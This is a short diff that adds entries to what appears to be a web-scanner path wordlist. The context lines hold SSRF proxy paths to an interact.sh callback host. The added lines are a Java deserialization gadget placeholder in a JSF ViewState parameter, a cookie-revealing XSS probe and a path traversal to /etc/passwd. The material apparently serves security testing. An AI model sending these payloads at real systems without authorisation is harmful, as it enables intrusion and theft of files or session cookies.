@@ -6,3 +6,7 @@
 /wps/PA_WCM_Authoring_UI/proxy/http/interact.sh
 /docpicker/internal_proxy/http/example.com
 /wps/PA_WCM_Authoring_UI/proxy/http/example.com
+/res/login.jsf?javax.faces.ViewState={{generate_java_gadget(
+/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/./../../../../../../../../../../etc/passwd
+/data/login
